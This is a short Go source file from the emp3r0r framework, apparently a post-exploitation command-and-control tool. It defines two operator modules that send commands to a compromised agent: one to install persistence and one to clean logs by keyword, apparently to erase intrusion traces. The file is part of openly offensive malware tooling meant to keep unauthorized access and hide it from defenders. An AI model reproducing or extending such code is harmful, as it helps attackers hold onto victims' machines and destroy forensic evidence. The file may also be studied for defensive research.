package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/internal/logging"
	"github.com/jm33-m0/emp3r0r/core/internal/runtime_def"
)

func modulePersistence() {
	methodOpt, ok := runtime_def.AvailableModuleOptions["method"]
	if !ok {
		logging.Errorf("Option 'method' not found")
		return
	}
	cmd := fmt.Sprintf("%s --method %s", emp3r0r_def.C2CmdPersistence, methodOpt.Val)
	err := agents.SendCmd(cmd, "", runtime_def.ActiveAgent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}

func moduleLogCleaner() {
	keywordOpt, ok := runtime_def.AvailableModuleOptions["keyword"]
	if !ok {
		logging.Errorf("Option 'keyword' not found")
		return
	}
	cmd := fmt.Sprintf("%s --keyword %s", emp3r0r_def.C2CmdCleanLog, keywordOpt.Val)
	err := agents.SendCmd(cmd, "", runtime_def.ActiveAgent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}
